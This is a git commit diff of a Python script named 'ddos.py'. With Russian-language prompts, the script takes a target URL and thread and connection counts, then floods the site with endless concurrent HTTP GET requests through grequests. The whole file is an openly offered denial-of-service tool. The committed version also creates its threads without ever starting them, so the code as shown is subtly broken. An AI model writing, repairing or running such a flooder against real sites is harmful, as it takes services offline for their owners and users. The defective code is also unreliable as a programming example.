8e36769a3fee874d1ff80c5ea5429226b4a750c0
VaRaMBaZ1 <92698950+VaRaMBaZ1@users.noreply.github.com>
2022-05-19 14:39:04 +0800

    Add files via upload

--- ddos.py
+++ ddos.py
@@ -1,15 +1,28 @@
 import grequests
+import threading
 
 site = input("Введите URL сайта: ")
-threads = int(input("Введите количество потоков: "))
+threads = int(input("Введите количество потоков[max 1000]: "))
+connect = int(input("Введите количество подключений[max: 100]: "))
+
+if connect > 100 or threads > 1000:
+    exit("Неверные значения!")
 packet = 0
 
-while True:
-    site_info = [site for x in range(threads)]
+def dos1(con):
+    while True:
+        site_info = [site for x in range(con)]
 
-    response = (grequests.get(url) for url in site_info)
-    resp = grequests.map(response)
+        response = (grequests.get(url) for url in site_info)
+        grequests.map(response)
 
-    packet += threads
+def dos2(con):
+    while True:
+        site_info = [site for x in range(con)]
 
-    print(f"Пакетов отправленно: {packet}")
+        response = (grequests.get(url) for url in site_info)
+        grequests.map(response)
+
+for potocki in range(threads):
+    threading.Thread(target=dos1, args=(connect, ))
+    threading.Thread(target=dos2, args=(connect, ))
